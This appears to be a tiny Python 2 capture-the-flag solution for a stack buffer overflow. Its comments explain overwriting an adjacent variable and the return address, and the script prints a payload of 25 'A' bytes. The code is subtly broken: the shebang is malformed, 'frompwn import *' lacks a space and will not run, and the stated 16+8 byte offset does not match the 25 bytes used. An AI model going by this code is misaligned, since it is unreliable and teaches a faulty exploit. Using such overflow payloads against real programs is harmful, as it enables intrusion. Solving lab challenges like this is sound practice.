# bin/bash/python2

#This question is simple, the variable code is first element to be overflown after buffer overflow.
#So,we just need to supply more input than what is required to overflow the stack

#To overflow rip, we need 16+8 input bytes

frompwn import *

payload = 'A'*25 #To overflow rip, we need 16+8 input bytes

print str(payload)
